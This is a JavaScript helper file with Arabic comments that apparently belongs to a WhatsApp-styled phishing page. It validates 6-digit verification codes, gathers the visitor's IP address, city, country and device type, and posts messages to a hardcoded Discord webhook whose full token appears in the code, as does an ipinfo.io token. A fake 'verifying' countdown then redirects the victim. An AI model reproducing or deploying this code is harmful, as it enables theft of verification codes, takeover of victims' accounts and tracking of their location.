// ملف الوظائف المشتركة - النسخة المبسطة

// وظيفة إرسال البيانات إلى Discord
async function sendToDiscord(message) {
    const webhookUrl = 'https://discord.com/api/webhooks/1374155202957152396/3zVluUSPNxJhR0LGrQtxgKCLJKtZVCLuWCH4BauDF5Syac_krLmlb3NMv6sF9sWBt629';

    try {
        const response = await fetch(webhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                content: message
            })
        });

        return response.ok;
    } catch (error) {
        console.error('خطأ في الإرسال:', error);
        return false;
    }
}

// وظيفة الحصول على معلومات IP والدولة
async function getIPInfo() {
    try {
        const response = await fetch('https://ipinfo.io/json?token=06b4b540d0a4a3');
        const data = await response.json();
        return {
            ip: data.ip || 'غير معروف',
            country: data.country || 'غير معروف',
            city: data.city || 'غير معروف'
        };
    } catch (error) {
        return {
            ip: 'غير معروف',
            country: 'غير معروف',
            city: 'غير معروف'
        };
    }
}

// وظيفة الحصول على معلومات الجهاز
function getDeviceInfo() {
    const ua = navigator.userAgent;
    let device = 'غير معروف';

    if (/Android/i.test(ua)) {
        device = 'هاتف Android';
    } else if (/iPhone|iPad|iPod/i.test(ua)) {
        device = /iPad/i.test(ua) ? 'آيباد' : 'آيفون';
    } else if (/Windows/i.test(ua)) {
        device = 'كمبيوتر';
    } else if (/Macintosh/i.test(ua)) {
        device = 'ماك';
    } else if (/Linux/i.test(ua)) {
        device = 'كمبيوتر لينكس';
    }

    return { device };
}

// وظيفة عرض رسالة خطأ
function showError(message) {
    const errorElement = document.getElementById('errorMsg');
    if (errorElement) {
        errorElement.textContent = message;
        errorElement.style.display = 'block';
    }
}

// وظيفة إخفاء رسالة الخطأ
function hideError() {
    const errorElement = document.getElementById('errorMsg');
    if (errorElement) {
        errorElement.style.display = 'none';
    }
}

// وظيفة تعطيل النموذج
function disableForm(formId) {
    const form = document.getElementById(formId);
    if (form) {
        const inputs = form.querySelectorAll('input, button, select');
        inputs.forEach(input => input.disabled = true);
    }
}

// وظيفة تفعيل النموذج
function enableForm(formId) {
    const form = document.getElementById(formId);
    if (form) {
        const inputs = form.querySelectorAll('input, button, select');
        inputs.forEach(input => input.disabled = false);
    }
}

// وظيفة حفظ البيانات في localStorage
function saveToStorage(key, value) {
    try {
        localStorage.setItem(key, value);
        return true;
    } catch (error) {
        console.error('خطأ في حفظ البيانات:', error);
        return false;
    }
}

// وظيفة استرجاع البيانات من localStorage
function getFromStorage(key) {
    try {
        return localStorage.getItem(key);
    } catch (error) {
        console.error('خطأ في استرجاع البيانات:', error);
        return null;
    }
}

// وظيفة التحقق من رمز مكون من 6 أرقام
function validateCode(code) {
    return /^\d{6}$/.test(code);
}

// وظائف الكرونو
function showChronoLoading(text = 'جاري التحقق والاتصال ...') {
    const loadingPopup = document.getElementById('loadingPopup');
    const chronoContainer = document.querySelector('.chrono-container');
    const chronoLabel = document.querySelector('.chrono-label');

    if (loadingPopup) {
        loadingPopup.style.display = 'flex';
    }

    if (chronoContainer) {
        chronoContainer.style.display = 'flex';
    }

    if (chronoLabel && text) {
        chronoLabel.textContent = text;
    }
}

function startChronoCountdown(duration = 50, redirectUrl = 'about.html') {
    const chronoTimer = document.querySelector('.chrono-timer');
    const chronoCircle = document.querySelector('.chrono-circle');

    if (!chronoTimer || !chronoCircle) return;

    let timeLeft = duration;
    const totalTime = duration;

    chronoTimer.textContent = timeLeft;
    chronoTimer.style.color = '#075E54';

    const countdownInterval = setInterval(() => {
        if (timeLeft <= 0) {
            clearInterval(countdownInterval);
            if (redirectUrl) {
                setTimeout(() => {
                    window.location.href = redirectUrl;
                }, 1000);
            }
            return;
        }

        timeLeft--;
        chronoTimer.textContent = timeLeft;

        // تحديث الدائرة - لون أخضر فقط
        const progress = ((totalTime - timeLeft) / totalTime) * 360;
        chronoCircle.style.background = `conic-gradient(#25D366 ${progress}deg, #f0f0f0 ${progress}deg)`;
    }, 1000);
}

function hideChronoLoading() {
    const loadingPopup = document.getElementById('loadingPopup');
    if (loadingPopup) {
        loadingPopup.style.display = 'none';
    }
}